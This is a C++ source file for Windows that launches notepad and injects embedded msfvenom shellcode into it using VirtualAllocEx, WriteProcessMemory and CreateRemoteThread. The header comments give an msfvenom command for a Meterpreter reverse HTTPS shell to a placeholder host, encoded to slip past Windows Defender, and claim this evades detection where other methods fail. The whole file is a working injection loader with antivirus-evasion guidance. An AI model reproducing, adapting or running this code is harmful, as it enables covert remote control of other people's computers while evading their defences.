// Windows 10 x64 
// Spawn notepad, inject shellcode into notepad process to pop calc
// Uses CreateRemoteThread.  Will be blocked by Defender (default meterp template)

// To evade defender:
//  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 --encoder x64/xor_dynamic -f c 

//  This actually works without getting caught by Defender.  Other methods, like generating an exe with
// this same payload/encoder or doing dll injection (dll_inject.cpp) will get caught

#include <iostream>
#include <windows.h>

int start_notepad()
{
    STARTUPINFO info;
    PROCESS_INFORMATION processInfo;

    ZeroMemory(&info, sizeof(info));
    info.cb = sizeof(info);

    LPCWSTR appname = L"C:\\windows\\system32\\notepad.exe";
    BOOL retval = CreateProcess(appname, NULL, NULL, NULL,
        TRUE, 0, NULL, NULL, &info, &processInfo);

    if (retval == FALSE)
    {
        MessageBox(HWND_DESKTOP, L"Couldn't start notepad", L"UH OH SPAGHETTIOS", MB_OK);
        return -1;
    }

    // get pid 
    int pid = processInfo.dwProcessId;

    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

    return pid;

}

int main()
{

    // start notepad process to inject into

    int process_id = start_notepad();
    if (process_id == -1)
        return 1;

    printf("Started notepad with pid %d\n", process_id);

    
    // msfvenom -p windows/x64/exec CMD=calc.exe -b '\x00\x0A\x0D' -f c exitfunc=thread -v shellcode
    char shellcode[] = 
       "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
       "\xff\xff\x48\xbb\x24\xbb\x8a\x89\x31\x1a\xcf\x1e\x48\x31\x58"
       "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xd8\xf3\x09\x6d\xc1\xf2"
       "\x0f\x1e\x24\xbb\xcb\xd8\x70\x4a\x9d\x4f\x72\xf3\xbb\x5b\x54"
       "\x52\x44\x4c\x44\xf3\x01\xdb\x29\x52\x44\x4c\x04\xf3\x01\xfb"
       "\x61\x52\xc0\xa9\x6e\xf1\xc7\xb8\xf8\x52\xfe\xde\x88\x87\xeb"
       "\xf5\x33\x36\xef\x5f\xe5\x72\x87\xc8\x30\xdb\x2d\xf3\x76\xfa"
       "\xdb\xc1\xba\x48\xef\x95\x66\x87\xc2\x88\xe1\x91\x4f\x96\x24"
       "\xbb\x8a\xc1\xb4\xda\xbb\x79\x6c\xba\x5a\xd9\xba\x52\xd7\x5a"
       "\xaf\xfb\xaa\xc0\x30\xca\x2c\x48\x6c\x44\x43\xc8\xba\x2e\x47"
       "\x56\x25\x6d\xc7\xb8\xf8\x52\xfe\xde\x88\xfa\x4b\x40\x3c\x5b"
       "\xce\xdf\x1c\x5b\xff\x78\x7d\x19\x83\x3a\x2c\xfe\xb3\x58\x44"
       "\xc2\x97\x5a\xaf\xfb\xae\xc0\x30\xca\xa9\x5f\xaf\xb7\xc2\xcd"
       "\xba\x5a\xd3\x57\x25\x6b\xcb\x02\x35\x92\x87\x1f\xf4\xfa\xd2"
       "\xc8\x69\x44\x96\x44\x65\xe3\xcb\xd0\x70\x40\x87\x9d\xc8\x9b"
       "\xcb\xdb\xce\xfa\x97\x5f\x7d\xe1\xc2\x02\x23\xf3\x98\xe1\xdb"
       "\x44\xd7\xc1\x8b\x1b\xcf\x1e\x24\xbb\x8a\x89\x31\x52\x42\x93"
       "\x25\xba\x8a\x89\x70\xa0\xfe\x95\x4b\x3c\x75\x5c\x8a\xfa\xd2"
       "\x34\x2e\xfa\x30\x2f\xa4\xa7\x52\xe1\xf1\xf3\x09\x4d\x19\x26"
       "\xc9\x62\x2e\x3b\x71\x69\x44\x1f\x74\x59\x37\xc9\xe5\xe3\x31"
       "\x43\x8e\x97\xfe\x44\x5f\xea\x50\x76\xac\x30\x41\xc3\xef\x89"
       "\x31\x1a\xcf\x1e";


        HANDLE notepad_handle;
        PVOID memory_buffer;

        // Get handle to notepad process
        notepad_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
        if (notepad_handle == NULL)
        {
            printf("Failed to get handle to notepad process\n");
            return -1;
        }
        else {
            printf("Got handle to notepad...\n");
        }

        // Allocate memory region for shellcode
        memory_buffer = VirtualAllocEx(notepad_handle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (memory_buffer == NULL)
        {
            printf("Failed to allocate memory in notepad\n");
            return -1;
        }
        else {
            printf("Allocated buffer in notepad process at addr 0x%p\n", memory_buffer);
        }

        // Write and execute shellcode
        printf("Writing shellcode into notepad process...\n");
        WriteProcessMemory(notepad_handle, (LPVOID)memory_buffer, (LPCVOID)shellcode, sizeof(shellcode), 0);

        printf("Executing injected code as new thread...\n");
        CreateRemoteThread(notepad_handle, NULL, 0, (LPTHREAD_START_ROUTINE)memory_buffer, NULL, NULL, NULL);
 
        printf("Injection Complete\n");
        return 0;
}
